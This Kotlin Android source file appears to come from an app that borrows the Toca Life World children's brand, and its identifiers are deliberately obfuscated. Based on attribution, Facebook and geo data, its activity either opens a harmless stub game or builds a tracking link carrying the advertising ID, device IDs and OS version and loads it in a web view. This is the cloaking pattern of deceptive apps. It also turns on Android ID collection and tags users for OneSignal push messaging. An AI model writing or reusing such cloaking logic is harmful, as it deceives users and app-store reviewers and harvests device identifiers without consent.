package com.tocaboca.tocalifeworlds.vgtgthhy

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerLib
import com.my.tracker.MyTracker
import com.onesignal.OneSignal
import com.tocaboca.tocalifeworlds.R
import com.tocaboca.tocalifeworlds.bbbhyhyhy.ApaApaApaClass
import com.tocaboca.tocalifeworlds.bbbhyhyhy.ApaApaApaClass.Companion.ju5uj5ujuj
import com.tocaboca.tocalifeworlds.frgtgtgt.VeboboboboboActivity2
import com.tocaboca.tocalifeworlds.gtjigtjigt.GammymymymActivity2
import org.json.JSONException
import org.json.JSONObject

class FilterFillalalalActivity : AppCompatActivity() {
    fun gthigthigthgthugt() {

        val appsDatafrgtgtgt = ju5uj5ujuj["AppsData"]
        val depapapapa = ju5uj5ujuj["FBData"]
        val gaidieifrrf = ju5uj5ujuj["GAID"]
        val linkakakokofefr = ju5uj5ujuj["View"]
        val geogotgthisosoyoy = ju5uj5ujuj["GeoHose"]
        val onlygeoeo = ju5uj5ujuj["GEO"]
        val numerroroor = ju5uj5ujuj["AppsCh"]
        val gtpktgtkkg = MyTracker.getTrackerParams()

        gtpktgtkkg.setCustomUserId(gaidieifrrf)
        hy5hy95hy95hy(gaidieifrrf.toString())


        val gtjoitgjoigtjogt = getSharedPreferences("NEWPR", Context.MODE_PRIVATE)

        val gtkgtojigtjigt = MyTracker.getInstanceId(applicationContext)

        val nhyjihyjihy = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val gtjogtjogtjogti = Build.VERSION.RELEASE
        val hy9uj = "sub_id_5="
        val juy5j9ju = "naming"
        val hy5ju95ju9uj = "orgdeep"
        val hy5hy559j5ju = "organika"
        val ghh555 = "deep"

        val hhyujuj59 = "sub_id_1="
        val hyhy5hy9 = "ad_id="
        val hy59hy59 = "deviceID="
        val bhjuuj2 = "sub_id_4="


        var hy5uj5uj5j9 = ""

        when (numerroroor) {
            "1" ->
                if (appsDatafrgtgtgt != "null") {
                    hy5uj5uj5j9 =
                        "$linkakakokofefr$hhyujuj59$appsDatafrgtgtgt&$hy59hy59$nhyjihyjihy&$hyhy5hy9$gaidieifrrf&$bhjuuj2$gtjogtjogtjogti&$hy9uj$juy5j9ju"

                    gtjoitgjoigtjogt.edit().putString("link", hy5uj5uj5j9).apply()
                    gtjoitgjoigtjogt.edit().putString("ENTRY_CODE", "web").apply()

                    stararttvbbbbbbbbb()
                    fgriojgtojgtjigtj()
                } else if (depapapapa != null || geogotgthisosoyoy!!.contains(onlygeoeo.toString())) {
                    hy5uj5uj5j9 =
                        "$linkakakokofefr$hhyujuj59$depapapapa&$hy59hy59$nhyjihyjihy&$hyhy5hy9$gaidieifrrf&$bhjuuj2$gtjogtjogtjogti&$hy9uj$hy5ju95ju9uj"
                    gtjoitgjoigtjogt.edit().putString("link", hy5uj5uj5j9).apply()
                    gtjoitgjoigtjogt.edit().putString("ENTRY_CODE", "web").apply()


                    stararttvbbbbbbbbb()
                    fgriojgtojgtjigtj()
                } else {

                    startActivity(Intent(this, GammymymymActivity2::class.java))
                    fgriojgtojgtjigtj()
                }
            "0" ->
                if (depapapapa != null) {
                    hy5uj5uj5j9 =
                        "$linkakakokofefr$hhyujuj59$depapapapa&$hy59hy59$gtkgtojigtjigt&$hyhy5hy9$gaidieifrrf&$bhjuuj2$gtjogtjogtjogti&$hy9uj$ghh555"
                    gtjoitgjoigtjogt.edit().putString("link", hy5uj5uj5j9).apply()
                    gtjoitgjoigtjogt.edit().putString("ENTRY_CODE", "web").apply()


                    stararttvbbbbbbbbb()
                    fgriojgtojgtjigtj()

                } else if (geogotgthisosoyoy!!.contains(onlygeoeo.toString())) {
                    hy5uj5uj5j9 = "$linkakakokofefr$hy59hy59$gtkgtojigtjigt&$hyhy5hy9$gaidieifrrf&$bhjuuj2$gtjogtjogtjogti&$hy9uj$hy5hy559j5ju"
                    gtjoitgjoigtjogt.edit().putString("link", hy5uj5uj5j9).apply()
                    gtjoitgjoigtjogt.edit().putString("ENTRY_CODE", "web").apply()

                    stararttvbbbbbbbbb()
                    fgriojgtojgtjigtj()
                } else {

                    startActivity(Intent(this, GammymymymActivity2::class.java))
                    fgriojgtojgtjigtj()
                }
        }
    }

    private fun stararttvbbbbbbbbb() {
        startActivity(Intent(this, VeboboboboboActivity2::class.java))
    }

    private fun fgriojgtojgtjigtj() {
        finish()
    }

    fun hy5hy95hy95hy(frjifrjirfjigt: String) {
        OneSignal.setExternalUserId(
            frjifrjirfjigt,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val ujujgtrfrfrfrf = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $ujujgtrfrfrfrf"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val gtgthyhyhyhy =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $gtgthyhyhyhy"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val dderffgrgtgtgt = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $dderffgrgtgtgt"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }



    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_filter_fillalalal)
        gthigthigthgthugt()
    }

}